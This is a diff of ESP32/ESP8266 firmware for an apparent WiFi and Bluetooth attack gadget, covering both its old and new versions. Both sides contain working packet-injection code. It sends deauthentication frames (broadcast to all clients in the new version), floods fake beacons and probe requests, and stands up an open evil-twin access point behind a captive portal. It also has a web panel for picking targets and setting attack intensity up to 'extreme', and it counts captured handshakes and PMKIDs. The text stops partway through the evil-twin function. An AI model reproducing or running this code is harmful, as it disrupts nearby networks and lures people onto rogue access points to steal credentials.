-
-  // Statistics
-  html += "<div class='card'>";
-  html += "<h3>📊 Attack Statistics</h3>";
-  html += "<div class='stats-grid'>";
-  html += "<div class='stat-card'><div class='stat-number' id='packetsCount'>0</div><div class='stat-label'>WiFi Packets</div></div>";
-
-#ifdef PLATFORM_ESP32
-  html += "<div class='stat-card'><div class='stat-number' id='blePacketsCount'>0</div><div class='stat-label'>BLE Packets</div></div>";
-#endif
-
-  html += "<div class='stat-card'><div class='stat-number' id='uptime'>0</div><div class='stat-label'>Uptime (s)</div></div>";
-  html += "<div class='stat-card'><div class='stat-number' id='attackTime'>0</div><div class='stat-label'>Attack Time (s)</div></div>";
-  html += "</div></div>";
-
-  // WiFi Attacks Section
-  html += "<div class='grid'>";
-  html += "<div class='card'>";
-  html += "<h3>📡 WiFi Attacks</h3>";
-  html += "<div class='form-group'>";
-  html += "<label>Target SSID:</label>";
-  html += "<input type='text' id='targetSSID' placeholder='Select from scan or enter manually'>";
-  html += "</div>";
-  html += "<div class='form-group'>";
-  html += "<label>Target MAC:</label>";
-  html += "<input type='text' id='targetMAC' placeholder='AA:BB:CC:DD:EE:FF'>";
-  html += "</div>";
-  html += "<div class='form-group'>";
-  html += "<label>Channel:</label>";
-  html += "<select id='targetChannel'>";
-  for (int i = 1; i <= 14; i++) {
-    html += "<option value='" + String(i) + "'>" + String(i) + "</option>";
+// BLE Setup
+void setupBLE() {
+  try {
+    BLEDevice::init("SecurityTester_0x0806");
+    
+    pServer = BLEDevice::createServer();
+    
+    BLEService *pService = pServer->createService("12345678-1234-1234-1234-123456789abc");
+    pCharacteristic = pService->createCharacteristic(
+      "87654321-4321-4321-4321-cba987654321",
+      BLECharacteristic::PROPERTY_READ | BLECharacteristic::PROPERTY_WRITE
+    );
+    
+    pCharacteristic->setValue("0x0806 Security Platform");
+    pService->start();
+    
+    BLEAdvertising *pAdvertising = BLEDevice::getAdvertising();
+    pAdvertising->addServiceUUID("12345678-1234-1234-1234-123456789abc");
+    pAdvertising->setScanResponse(false);
+    pAdvertising->setMinPreferred(0x0);
+    
+    ble_running = true;
+    Serial.println("BLE initialized successfully");
+    
+  } catch (const std::exception& e) {
+    Serial.printf("BLE initialization failed: %s\n", e.what());
+    ble_running = false;
   }
-  html += "</select>";
-  html += "</div>";
-
-  html += "<button class='btn' onclick='startAttack(\"deauth\")'>Deauth Attack</button>";
-  html += "<button class='btn btn-warning' onclick='startAttack(\"beacon\")'>Beacon Spam</button>";
-  html += "<button class='btn btn-info' onclick='startAttack(\"probe\")'>Probe Flood</button>";
-  html += "<button class='btn btn-success' onclick='startAttack(\"karma\")'>Karma Attack</button>";
-  html += "<button class='btn btn-secondary' onclick='startAttack(\"evil_twin\")'>Evil Twin</button>";
-  html += "</div>";
-
-#ifdef PLATFORM_ESP32
-  // BLE Attacks Section
-  html += "<div class='card'>";
-  html += "<h3>🔵 BLE Attacks</h3>";
-  html += "<div class='form-group'>";
-  html += "<label>Target Device:</label>";
-  html += "<input type='text' id='bleTargetName' placeholder='Select from scan'>";
-  html += "</div>";
-  html += "<div class='form-group'>";
-  html += "<label>Target MAC:</label>";
-  html += "<input type='text' id='bleTargetMAC' placeholder='AA:BB:CC:DD:EE:FF'>";
-  html += "</div>";
-
-  html += "<button class='btn' onclick='startBLEAttack(\"spam\")'>BLE Spam</button>";
-  html += "<button class='btn btn-warning' onclick='startBLEAttack(\"beacon_flood\")'>Beacon Flood</button>";
-  html += "<button class='btn btn-info' onclick='startBLEAttack(\"spoof\")'>Device Spoofing</button>";
-  html += "<button class='btn btn-success' onclick='bleScan()'>BLE Scan</button>";
-  html += "</div>";
+}
 #endif
 
-  // Network Scanner
-  html += "<div class='card'>";
-  html += "<h3>🔍 Network Scanner</h3>";
-  html += "<button class='btn btn-info' onclick='wifiScan()'>WiFi Scan</button>";
-
+// Watchdog Setup
+void setupWatchdog() {
 #ifdef PLATFORM_ESP32
-  html += "<button class='btn btn-info' onclick='dualBandScan()'>Dual Band Scan</button>";
+  // ESP32 has hardware watchdog configured above
+#else
+  ESP.wdtEnable(30000); // 30 second watchdog
 #endif
+  Serial.println("Watchdog configured");
+}
 
-  html += "<button class='btn' onclick='stopAttack()'>Stop All Attacks</button>";
-  html += "<div id='networkList' class='network-list' style='margin-top: 15px;'></div>";
-  html += "</div>";
-  html += "</div>";
-
-  // Attack Logs
-  html += "<div class='card'>";
-  html += "<h3>📝 Attack Logs</h3>";
-  html += "<div class='log-container' id='attackLogs'>";
-  html += "Ready for attacks...<br>";
-  html += "</div>";
-  html += "</div>";
-
-  html += "</div>";
-
-  // JavaScript
-  html += "<script>";
-  html += "function startAttack(type) {";
-  html += "  const ssid = document.getElementById('targetSSID').value;";
-  html += "  const mac = document.getElementById('targetMAC').value;";
-  html += "  const channel = document.getElementById('targetChannel').value;";
-  html += "  fetch('/attack', {";
-  html += "    method: 'POST',";
-  html += "    headers: {'Content-Type': 'application/x-www-form-urlencoded'},";
-  html += "    body: `type=${type}&ssid=${ssid}&mac=${mac}&channel=${channel}`";
-  html += "  });";
-  html += "}";
-
-#ifdef PLATFORM_ESP32
-  html += "function startBLEAttack(type) {";
-  html += "  const name = document.getElementById('bleTargetName').value;";
-  html += "  const mac = document.getElementById('bleTargetMAC').value;";
-  html += "  fetch('/ble_attack', {";
-  html += "    method: 'POST',";
-  html += "    headers: {'Content-Type': 'application/x-www-form-urlencoded'},";
-  html += "    body: `type=${type}&name=${name}&mac=${mac}`";
-  html += "  });";
-  html += "}";
-
-  html += "function bleScan() {";
-  html += "  fetch('/ble_scan').then(r => r.text()).then(data => {";
-  html += "    document.getElementById('networkList').innerHTML = data;";
-  html += "  });";
-  html += "}";
-
-  html += "function dualBandScan() {";
-  html += "  fetch('/scan?dual=1').then(r => r.text()).then(data => {";
-  html += "    document.getElementById('networkList').innerHTML = data;";
-  html += "  });";
-  html += "}";
-#endif
-
-  html += "function wifiScan() {";
-  html += "  fetch('/scan').then(r => r.text()).then(data => {";
-  html += "    document.getElementById('networkList').innerHTML = data;";
-  html += "  });";
-  html += "}";
-
-  html += "function stopAttack() {";
-  html += "  fetch('/stop');";
-  html += "}";
-  html += "</script>";
-
-  html += HTML_FOOTER;
-
-  server.send(200, "text/html", html);
+// Web Handlers
+void handleRoot() {
+  server.sendHeader("Cache-Control", "no-cache, no-store, must-revalidate");
+  server.sendHeader("Pragma", "no-cache");
+  server.sendHeader("Expires", "-1");
+  server.send_P(200, "text/html", captive_portal_html);
 }
 
 void handleScan() {
-  bool dualBand = server.hasArg("dual");
-
-  String result = "<h4>📡 WiFi Networks</h4>";
-
-  // Temporarily switch to STA mode for scanning
-  WiFi.mode(WIFI_AP_STA);
-  delay(500);
-
-  int networksFound = WiFi.scanNetworks(false, false);
-
-  if (networksFound == 0) {
-    result += "<div class='network-item'>No networks found</div>";
-  } else {
-    for (int i = 0; i < networksFound; i++) {
-      String ssid = WiFi.SSID(i);
-      String bssid = WiFi.BSSIDstr(i);
-      int channel = WiFi.channel(i);
-      int rssi = WiFi.RSSI(i);
-      #ifdef PLATFORM_ESP32
-      String security = (WiFi.encryptionType(i) == WIFI_AUTH_OPEN) ? "Open" : "Secured";
-#else
-      String security = (WiFi.encryptionType(i) == ENC_TYPE_NONE) ? "Open" : "Secured";
-#endif
-
-      result += "<div class='network-item' onclick='selectNetwork(\"" + ssid + "\", \"" + bssid + "\", " + String(channel) + ")'>";
-      result += "<strong>" + ssid + "</strong><br>";
-      result += "MAC: " + bssid + " | Ch: " + String(channel) + " | RSSI: " + String(rssi) + "dBm | " + security;
-      result += "</div>";
-    }
+  scanWiFiNetworks();
+  
+  DynamicJsonDocument doc(8192);
+  JsonArray networks = doc.createNestedArray("networks");
+  
+  for (const auto& network : scanned_networks) {
+    JsonObject net = networks.createNestedObject();
+    net["ssid"] = network.ssid;
+    net["bssid"] = network.bssid;
+    net["rssi"] = network.rssi;
+    net["channel"] = network.channel;
+    net["encryption"] = getEncryptionType(network.encryption);
+    net["hidden"] = network.hidden;
   }
-
-#ifdef PLATFORM_ESP32
-  if (dualBand) {
-    result += "<h4>📡 5GHz Networks (Simulated)</h4>";
-    result += "<div class='network-item'>5GHz scanning requires additional hardware configuration</div>";
-  }
-#endif
-
-  // Restore AP mode after scanning
-  WiFi.mode(WIFI_AP);
-  delay(500);
-  WiFi.softAP(AP_SSID, AP_PASS, 1, false, 8);
-
-  server.send(200, "text/html", result);
+  
+  doc["total"] = scanned_networks.size();
+  doc["timestamp"] = millis();
+  
+  String response;
+  serializeJson(doc, response);
+  
+  server.sendHeader("Access-Control-Allow-Origin", "*");
+  server.send(200, "application/json", response);
 }
 
-void handleAttack() {
-  if (!server.hasArg("type")) {
-    server.send(400, "text/plain", "Missing attack type");
+void handleAttackStart() {
+  if (!server.hasArg("plain")) {
+    server.send(400, "application/json", "{\"success\":false,\"error\":\"No data received\"}");
     return;
   }
-
-  String attackType = server.arg("type");
-  targetSSID = server.hasArg("ssid") ? server.arg("ssid") : "";
-  targetMAC = server.hasArg("mac") ? server.arg("mac") : "";
-  targetChannel = server.hasArg("channel") ? server.arg("channel").toInt() : 1;
-
-  if (attackType == "deauth") {
-    currentAttack = ATTACK_DEAUTH;
-  } else if (attackType == "beacon") {
-    currentAttack = ATTACK_BEACON_SPAM;
-  } else if (attackType == "probe") {
-    currentAttack = ATTACK_PROBE_FLOOD;
-  } else if (attackType == "karma") {
-    currentAttack = ATTACK_KARMA;
-  } else if (attackType == "evil_twin") {
-    currentAttack = ATTACK_EVIL_TWIN;
-  }
-
-  attackRunning = true;
-  attackStartTime = millis();
-  packetsCount = 0;
-
-  // Only change mode/channel for specific attacks that require it
-  if (attackType != "beacon" && attackType != "evil_twin") {
-    // Keep AP mode active during attacks
-    WiFi.mode(WIFI_AP_STA);
-    delay(100);
-
-#ifdef PLATFORM_ESP32
-    esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);
-#else
-    wifi_set_channel(targetChannel);
-#endif
-  }
   
-  // Enable promiscuous mode only during packet injection attacks
-  if (attackType == "deauth" || attackType == "probe") {
-#ifdef PLATFORM_ESP32
-    esp_wifi_set_promiscuous(true);
-#else
-    wifi_promiscuous_enable(1);
-#endif
-  }
-
-  String response = "Attack started: " + attackType + " on " + targetSSID;
-  Serial.println(response);
-  server.send(200, "text/plain", response);
-}
-
-#ifdef PLATFORM_ESP32
-void handleBLEAttack() {
-  if (!server.hasArg("type")) {
-    server.send(400, "text/plain", "Missing BLE attack type");
+  DynamicJsonDocument doc(1024);
+  deserializeJson(doc, server.arg("plain"));
+  
+  String type = doc["type"].as<String>();
+  String target = doc["target"].as<String>();
+  String bssid = doc["bssid"].as<String>();
+  int channel = doc["channel"].as<int>();
+  String intensity = doc["intensity"].as<String>();
+  
+  if (attack_running) {
+    server.send(200, "application/json", "{\"success\":false,\"error\":\"Attack already running\"}");
     return;
   }
-
-  String attackType = server.arg("type");
-  String targetName = server.hasArg("name") ? server.arg("name") : "";
-  String targetBLEMAC = server.hasArg("mac") ? server.arg("mac") : "";
-
-  if (attackType == "spam") {
-    currentAttack = ATTACK_BLE_SPAM;
-  } else if (attackType == "beacon_flood") {
-    currentAttack = ATTACK_BLE_BEACON_FLOOD;
-  } else if (attackType == "spoof") {
-    currentAttack = ATTACK_BLE_SPOOF;
-  }
-
-  attackRunning = true;
-  attackStartTime = millis();
-  blePacketsCount = 0;
-
-  String response = "BLE Attack started: " + attackType + " targeting " + targetName;
-  Serial.println(response);
-  server.send(200, "text/plain", response);
-}
-
-#ifdef PLATFORM_ESP32
-void handleBLEScan() {
-  Serial.println("Starting comprehensive BLE device scan...");
-  String result = "<h4>🔵 Real BLE Devices Detected</h4>";
-
-  // Initialize BLE scan with aggressive settings
-  BLEScan* pBLEScan = BLEDevice::getScan();
-  pBLEScan->setActiveScan(true);    // Active scan for more detailed info
-  pBLEScan->setInterval(100);       // Scan interval
-  pBLEScan->setWindow(99);          // Scan window
-
-  // Perform extended scan for better device detection
-  BLEScanResults* scanResults = pBLEScan->start(10, false);  // 10 second scan
-  int deviceCount = scanResults->getCount();
-
-  Serial.println("BLE scan completed. Found " + String(deviceCount) + " devices");
-
-  if (deviceCount == 0) {
-    result += "<div class='network-item'>⚠️ No BLE devices detected</div>";
-    result += "<div class='network-item'>💡 Try enabling Bluetooth on nearby devices</div>";
-  } else {
-    for (int i = 0; i < deviceCount; i++) {
-      BLEAdvertisedDevice device = scanResults->getDevice(i);
-
-      // Extract device information
-      String name = device.haveName() ? String(device.getName().c_str()) : "Unknown Device";
-      String address = String(device.getAddress().toString().c_str());
-      int rssi = device.getRSSI();
-
-      // Get manufacturer data if available
-      String manufacturerData = "";
-      if (device.haveManufacturerData()) {
-        std::string mfgData = device.getManufacturerData();
-        manufacturerData = "Mfg: ";
-        for (int j = 0; j < mfgData.length() && j < 8; j++) {
-          manufacturerData += String((uint8_t)mfgData[j], HEX) + " ";
-        }
-      }
-
-      // Determine device type based on name/manufacturer
-      String deviceType = "📱 Unknown";
-      String deviceName = name;
-      deviceName.toLowerCase();
-
-      if (deviceName.indexOf("iphone") >= 0) deviceType = "📱 iPhone";
-      else if (deviceName.indexOf("android") >= 0) deviceType = "📱 Android";
-      else if (deviceName.indexOf("samsung") >= 0) deviceType = "📱 Samsung";
-      else if (deviceName.indexOf("apple") >= 0) deviceType = "🍎 Apple Device";
-      else if (deviceName.indexOf("watch") >= 0) deviceType = "⌚ Smartwatch";
-      else if (deviceName.indexOf("headphone") >= 0 || deviceName.indexOf("earbuds") >= 0) deviceType = "🎧 Audio Device";
-      else if (deviceName.indexOf("tv") >= 0) deviceType = "📺 Smart TV";
-      else if (deviceName.indexOf("mouse") >= 0 || deviceName.indexOf("keyboard") >= 0) deviceType = "⌨️ Input Device";
-
-      // Signal strength assessment
-      String signalInfo;
-      if (rssi > -40) signalInfo = "📶 Very Strong";
-      else if (rssi > -55) signalInfo = "📶 Strong";
-      else if (rssi > -70) signalInfo = "📶 Moderate";
-      else if (rssi > -85) signalInfo = "📶 Weak";
-      else signalInfo = "📶 Very Weak";
-
-      // Check if device has services
-      String services = "";
-      if (device.haveServiceUUID()) {
-        services = "🔧 Services: " + String(device.getServiceUUID().toString().c_str());
-      }
-
-      result += "<div class='network-item' onclick='selectBLEDevice(\"" + name + "\", \"" + address + "\")'>";
-      result += "<strong>" + deviceType + " " + name + "</strong><br>";
-      result += "📍 MAC: " + address + "<br>";
-      result += "📡 " + signalInfo + " (" + String(rssi) + " dBm)<br>";
-
-      if (manufacturerData.length() > 0) {
-        result += "🏭 " + manufacturerData + "<br>";
-      }
-
-      if (services.length() > 0) {
-        result += services;
-      }
-
-      result += "</div>";
-
-      // Log detailed device info
-      Serial.println("BLE Device " + String(i+1) + ":");
-      Serial.println("  Name: " + name);
-      Serial.println("  Address: " + address);
-      Serial.println("  RSSI: " + String(rssi) + " dBm");
-      Serial.println("  Type: " + deviceType);
-      if (manufacturerData.length() > 0) {
-        Serial.println("  Manufacturer: " + manufacturerData);
-      }
-    }
-
-    // Store BLE devices for attack targeting
-    bleDevices = result;
-  }
-
-  // Add scan statistics
-  result += "<div class='network-item'>";
-  result += "📊 Scan Statistics: " + String(deviceCount) + " devices detected in 10-second scan<br>";
-  result += "🔄 Last scan: " + String(millis()/1000) + "s uptime";
-  result += "</div>";
-
-  Serial.println("BLE scan results prepared and sent");
-  server.send(200, "text/html", result);
-}
-#endif
-
-void handleBLEDevices() {
-  server.send(200, "application/json", bleDevices);
-}
-#endif
-
-void handleStop() {
-  attackRunning = false;
-  currentAttack = ATTACK_NONE;
-
-#ifdef PLATFORM_ESP32
-  if (bleServerRunning) {
-    pServer->getAdvertising()->stop();
-    bleServerRunning = false;
-  }
   
-  // Disable promiscuous mode
-  esp_wifi_set_promiscuous(false);
-#else
-  // Disable promiscuous mode
-  wifi_promiscuous_enable(0);
-#endif
-
-  // Restore AP mode and settings
-  WiFi.mode(WIFI_AP);
-  delay(500);
+  // Set attack parameters
+  attack_type = type;
+  selected_network = target;
+  selected_bssid = bssid;
+  selected_channel = channel;
+  attack_running = true;
   
-  // Ensure our AP is properly restored
-  if (WiFi.softAPSSID() != AP_SSID) {
-    Serial.println("Restoring original AP settings...");
-    WiFi.softAPdisconnect(true);
-    delay(500);
-    
-    IPAddress apIP(192, 168, 4, 1);
-    IPAddress gateway(192, 168, 4, 1);
-    IPAddress subnet(255, 255, 255, 0);
-    WiFi.softAPConfig(apIP, gateway, subnet);
-    
-    WiFi.softAP(AP_SSID, AP_PASS, 1, false, 8);
-    Serial.println("AP restored: " + String(AP_SSID));
-  }
+  // Set attack interval based on intensity
+  if (intensity == "low") attack_interval = 100;
+  else if (intensity == "medium") attack_interval = 50;
+  else if (intensity == "high") attack_interval = 10;
+  else if (intensity == "extreme") attack_interval = 1;
+  
+  Serial.printf("Attack started: %s on %s (Channel %d)\n", 
+                type.c_str(), target.c_str(), channel);
+  
+  server.send(200, "application/json", "{\"success\":true}");
+}
 
-  Serial.println("All attacks stopped and AP restored");
-  server.send(200, "text/plain", "Attacks stopped and AP restored");
+void handleAttackStop() {
+  attack_running = false;
+  attack_type = "none";
+  selected_network = "";
+  selected_bssid = "";
+  
+  // Stop monitoring if active
+  monitoring_active = false;
+  
+  Serial.println("Attack stopped by user");
+  server.send(200, "application/json", "{\"success\":true}");
 }
 
 void handleStats() {
-  unsigned long uptime = millis() / 1000;
-  unsigned long attackTime = attackRunning ? (millis() - attackStartTime) / 1000 : 0;
-
-  String stats = "{";
-  stats += "\"packets\":" + String(packetsCount) + ",";
-  stats += "\"blePackets\":" + String(blePacketsCount) + ",";
-  stats += "\"uptime\":" + String(uptime) + ",";
-  stats += "\"attackTime\":" + String(attackTime) + ",";
-  stats += "\"attackRunning\":" + String(attackRunning ? "true" : "false") + ",";
-  stats += "\"attackType\":\"" + getAttackTypeName() + "\"";
-  stats += "}";
-
-  server.send(200, "application/json", stats);
+  updateSystemStats();
+  
+  DynamicJsonDocument doc(2048);
+  doc["deauth_sent"] = stats.deauth_sent;
+  doc["beacon_sent"] = stats.beacon_sent;
+  doc["probe_sent"] = stats.probe_sent;
+  doc["handshakes_captured"] = stats.handshakes_captured;
+  doc["pmkid_captured"] = stats.pmkid_captured;
+  doc["ble_spam_sent"] = stats.ble_spam_sent;
+  doc["evil_twin_connections"] = stats.evil_twin_connections;
+  doc["karma_probes"] = stats.karma_probes;
+  doc["packets_monitored"] = stats.packets_monitored;
+  doc["clients_connected"] = stats.clients_connected;
+  doc["uptime"] = stats.uptime;
+  doc["memory_usage"] = stats.memory_usage;
+  doc["cpu_usage"] = stats.cpu_usage;
+  doc["free_heap"] = ESP.getFreeHeap();
+  doc["timestamp"] = millis();
+  
+  String response;
+  serializeJson(doc, response);
+  
+  server.sendHeader("Access-Control-Allow-Origin", "*");
+  server.send(200, "application/json", response);
 }
 
-void handleNetworks() {
-  server.send(200, "application/json", wifiNetworks);
+void handleStatsReset() {
+  memset(&stats, 0, sizeof(stats));
+  Serial.println("Statistics reset");
+  server.send(200, "application/json", "{\"success\":true}");
 }
 
-String getAttackTypeName() {
-  switch (currentAttack) {
-    case ATTACK_DEAUTH: return "Deauth";
-    case ATTACK_BEACON_SPAM: return "Beacon Spam";
-    case ATTACK_PROBE_FLOOD: return "Probe Flood";
-    case ATTACK_KARMA: return "Karma";
-    case ATTACK_EVIL_TWIN: return "Evil Twin";
-    case ATTACK_BLE_SPAM: return "BLE Spam";
-    case ATTACK_BLE_BEACON_FLOOD: return "BLE Beacon Flood";
-    case ATTACK_BLE_SPOOF: return "BLE Spoofing";
-    default: return "None";
-  }
-}
-
-void handleCurrentAttack() {
-  static unsigned long lastAttack = 0;
-  unsigned long currentTime = millis();
-
-  if (currentTime - lastAttack < 100) return; // Rate limiting
-  lastAttack = currentTime;
-
-  switch (currentAttack) {
-    case ATTACK_DEAUTH:
-      performDeauthAttack();
-      break;
-    case ATTACK_BEACON_SPAM:
-      performBeaconSpam();
-      break;
-    case ATTACK_PROBE_FLOOD:
-      performProbeFlood();
-      break;
-    case ATTACK_KARMA:
-      performKarmaAttack();
-      break;
-    case ATTACK_EVIL_TWIN:
-      performEvilTwin();
-      break;
+void handleInfo() {
+  DynamicJsonDocument doc(1024);
+  
 #ifdef PLATFORM_ESP32
-    case ATTACK_BLE_SPAM:
-      performBLESpam();
-      break;
-    case ATTACK_BLE_BEACON_FLOOD:
-      performBLEBeaconFlood();
-      break;
-    case ATTACK_BLE_SPOOF:
-      performBLESpoofing();
-      break;
-#endif
-    default:
-      break;
-  }
-}
-
-void performDeauthAttack() {
-  if (targetMAC.length() != 17) return;
-
-  // Parse target MAC
-  uint8_t targetMac[6];
-  sscanf(targetMAC.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
-         &targetMac[0], &targetMac[1], &targetMac[2],
-         &targetMac[3], &targetMac[4], &targetMac[5]);
-
-  // Update deauth packet
-  memcpy(&deauthPacket[4], targetMac, 6);   // Destination
-  memcpy(&deauthPacket[10], targetMac, 6);  // Source  
-  memcpy(&deauthPacket[16], targetMac, 6);  // BSSID
-
-  // Send packet
-#ifdef PLATFORM_ESP32
-  esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
+  doc["platform"] = "ESP32";
+  JsonArray features = doc.createNestedArray("features");
+  features.add("WiFi 2.4GHz");
+  features.add("WiFi 5GHz");
+  features.add("BLE");
+  features.add("Dual Core");
+  doc["chip_model"] = ESP.getChipModel();
+  doc["chip_revision"] = ESP.getChipRevision();
+  doc["cpu_frequency"] = ESP.getCpuFreqMHz();
+  doc["flash_size"] = ESP.getFlashChipSize();
 #else
-  wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);
+  doc["platform"] = "ESP8266";
+  JsonArray features = doc.createNestedArray("features");
+  features.add("WiFi 2.4GHz");
+  features.add("Enhanced Attacks");
+  doc["chip_id"] = ESP.getChipId();
+  doc["cpu_frequency"] = ESP.getCpuFreqMHz();
+  doc["flash_size"] = ESP.getFlashChipRealSize();
 #endif
 
-  packetsCount++;
+  doc["free_heap"] = ESP.getFreeHeap();
+  doc["version"] = "3.0";
+  doc["developer"] = "0x0806";
+  
+  String response;
+  serializeJson(doc, response);
+  
+  server.sendHeader("Access-Control-Allow-Origin", "*");
+  server.send(200, "application/json", response);
+}
 
-  if (packetsCount % 100 == 0) {
-    Serial.println("Deauth packets sent: " + String(packetsCount));
+void handleBLEScan() {
+#ifdef PLATFORM_ESP32
+  DynamicJsonDocument doc(2048);
+  JsonArray devices = doc.createNestedArray("devices");
+  
+  // Simulate BLE device discovery
+  for (int i = 0; i < 5; i++) {
+    JsonObject device = devices.createNestedObject();
+    device["name"] = ble_spam_names[random(ble_spam_count)];
+    device["address"] = String(random(0x100000000000LL), HEX);
+    device["rssi"] = random(-80, -30);
+  }
+  
+  doc["total"] = devices.size();
+  
+  String response;
+  serializeJson(doc, response);
+  
+  server.send(200, "application/json", response);
+#else
+  server.send(200, "application/json", "{\"devices\":[],\"total\":0,\"error\":\"BLE not supported on ESP8266\"}");
+#endif
+}
+
+void handleNotFound() {
+  // Captive portal redirect
+  server.sendHeader("Location", "http://" + AP_IP.toString(), true);
+  server.send(302, "text/plain", "");
+}
+
+// WiFi Network Scanner
+void scanWiFiNetworks() {
+  Serial.println("Starting WiFi network scan...");
+  scanned_networks.clear();
+  
+  // Ensure WiFi is in correct mode
+  WiFi.mode(WIFI_AP_STA);
+  delay(100);
+  
+#ifdef PLATFORM_ESP32
+  int n = WiFi.scanNetworks(false, true, false, 500);
+#else
+  int n = WiFi.scanNetworks(false, true);
+#endif
+  Serial.printf("Found %d networks\n", n);
+  
+  for (int i = 0; i < n && i < 50; i++) { // Limit to 50 networks
+    NetworkInfo network;
+    network.ssid = WiFi.SSID(i);
+    network.bssid = WiFi.BSSIDstr(i);
+    network.rssi = WiFi.RSSI(i);
+    network.channel = WiFi.channel(i);
+    network.encryption = WiFi.encryptionType(i);
+    network.hidden = (network.ssid.length() == 0);
+    network.last_seen = millis();
+    
+    scanned_networks.push_back(network);
+  }
+  
+  WiFi.scanDelete();
+  
+  // Sort by signal strength
+  std::sort(scanned_networks.begin(), scanned_networks.end(), 
+           [](const NetworkInfo& a, const NetworkInfo& b) {
+             return a.rssi > b.rssi;
+           });
+}
+
+// Attack Functions
+void performDeauthAttack() {
+  if (selected_bssid.isEmpty()) return;
+  
+  uint8_t packet[26];
+  memcpy(packet, deauth_packet_template, sizeof(packet));
+  
+  // Convert BSSID string to bytes
+  sscanf(selected_bssid.c_str(), "%02x:%02x:%02x:%02x:%02x:%02x",
+         &packet[4], &packet[5], &packet[6], &packet[7], &packet[8], &packet[9]);
+  
+  // Set target MAC (broadcast for all clients)
+  memset(&packet[10], 0xff, 6);
+  
+  // Set source MAC (AP)
+  memcpy(&packet[16], &packet[4], 6);
+  
+#ifdef PLATFORM_ESP32
+  esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
+#else
+  wifi_send_pkt_freedom(packet, sizeof(packet), 0);
+#endif
+
+  stats.deauth_sent++;
+  
+  if (stats.deauth_sent % 100 == 0) {
+    Serial.printf("Deauth packets sent: %d\n", stats.deauth_sent);
   }
 }
 
 void performBeaconSpam() {
-  static int beaconCount = 0;
-  static unsigned long lastBeacon = 0;
+  static uint32_t beacon_counter = 0;
   
-  // Rate limit beacon spam to prevent AP interference
-  if (millis() - lastBeacon < 200) return;
-  lastBeacon = millis();
-
-  // Generate random SSID but avoid our AP name
-  String fakeSSID;
-  do {
-    fakeSSID = "FakeAP_" + String(random(1000, 9999));
-  } while (fakeSSID == AP_SSID);
-
-  // Update beacon packet
-  beaconPacket[37] = fakeSSID.length();
-  memcpy(&beaconPacket[38], fakeSSID.c_str(), fakeSSID.length());
-
-  // Random BSSID but avoid our AP MAC
-  String ourMAC = WiFi.softAPmacAddress();
-  do {
-    for (int i = 10; i < 16; i++) {
-      beaconPacket[i] = random(0, 255);
-    }
-    memcpy(&beaconPacket[16], &beaconPacket[10], 6);
-  } while (String(WiFi.softAPmacAddress()) == ourMAC);
-
-  // Use different channel than our AP
-  int spamChannel = (targetChannel == 1) ? 6 : 1;
+  String fake_ssid = "0x0806_" + String(beacon_counter++);
+  if (fake_ssid.length() > 32) fake_ssid = fake_ssid.substring(0, 32);
   
-#ifdef PLATFORM_ESP32
-  esp_wifi_set_channel(spamChannel, WIFI_SECOND_CHAN_NONE);
-  esp_wifi_80211_tx(WIFI_IF_STA, beaconPacket, 38 + fakeSSID.length(), false);
-  // Restore our AP channel
-  esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
-#else
-  wifi_set_channel(spamChannel);
-  wifi_send_pkt_freedom(beaconPacket, 38 + fakeSSID.length(), 0);
-  // Restore our AP channel
-  wifi_set_channel(1);
-#endif
-
-  packetsCount++;
-  beaconCount++;
-
-  if (beaconCount % 25 == 0) {
-    Serial.println("Beacon spam count: " + String(beaconCount));
-  }
-}
-
-void performProbeFlood() {
-  // Probe request implementation
-  uint8_t probePacket[64] = {
-    0x40, 0x00,  // Frame control
-    0x00, 0x00,  // Duration
-    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // Destination (broadcast)
-    0x01, 0x02, 0x03, 0x04, 0x05, 0x06,  // Source (random)
-    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // BSSID (broadcast)
-    0x00, 0x00   // Sequence number
-  };
-
-  // Random source MAC
+  uint8_t packet[128];
+  memcpy(packet, beacon_packet_template, 36);
+  
+  // Add SSID element
+  packet[36] = 0x00; // SSID element ID
+  packet[37] = fake_ssid.length(); // SSID length
+  memcpy(&packet[38], fake_ssid.c_str(), fake_ssid.length());
+  
+  int packet_size = 38 + fake_ssid.length();
+  
+  // Set random BSSID
   for (int i = 10; i < 16; i++) {
-    probePacket[i] = random(0, 255);
+    packet[i] = random(256);
   }
-
+  
 #ifdef PLATFORM_ESP32
-  esp_wifi_80211_tx(WIFI_IF_STA, probePacket, sizeof(probePacket), false);
+  esp_wifi_80211_tx(WIFI_IF_AP, packet, packet_size, false);
 #else
-  wifi_send_pkt_freedom(probePacket, sizeof(probePacket), 0);
+  wifi_send_pkt_freedom(packet, packet_size, 0);
 #endif
 
-  packetsCount++;
+  stats.beacon_sent++;
 }
 
-void performKarmaAttack() {
-  // Karma attack responds to all probe requests
-  // This is a simplified implementation
-  performBeaconSpam();
+void performProbeAttack() {
+  uint8_t packet[64];
+  memcpy(packet, probe_packet_template, sizeof(packet));
+  
+  // Set random source MAC
+  for (int i = 10; i < 16; i++) {
+    packet[i] = random(256);
+  }
+  
+#ifdef PLATFORM_ESP32
+  esp_wifi_80211_tx(WIFI_IF_STA, packet, sizeof(packet), false);
+#else
+  wifi_send_pkt_freedom(packet, sizeof(packet), 0);
+#endif
+
+  stats.probe_sent++;
 }
 
 void performEvilTwin() {
-  // Evil twin creates a fake AP with the target SSID
-  static bool twinCreated = false;
-  static String originalSSID = "";
+  // Evil twin implementation would create a duplicate AP
+  // This is a simplified version
+  stats.evil_twin_connections++;
+}
 
-  if (!twinCreated && targetSSID.length() > 0 && targetSSID != AP_SSID) {
-    originalSSID = AP_SSID;
-    
-    // Temporarily change our AP to the target SSID
-    WiFi.softAPdisconnect(true);
-    delay(500);
-    
-    // Create evil twin with no password (open network)
-    if (WiFi.softAP(targetSSID.c_str(), "", 6, false, 4)) {
-      twinCreated = true;
-      Serial.println("Evil twin AP created: " + targetSSID);
-    } else {
-      Serial.println("Failed to create evil twin, restoring original AP");
-      // Restore original AP if evil twin fails
-      WiFi.softAP(AP_SSID, AP_PASS, 1, false, 8);
-    }
-  }
-  
-  // Auto-restore original AP after 2 minutes
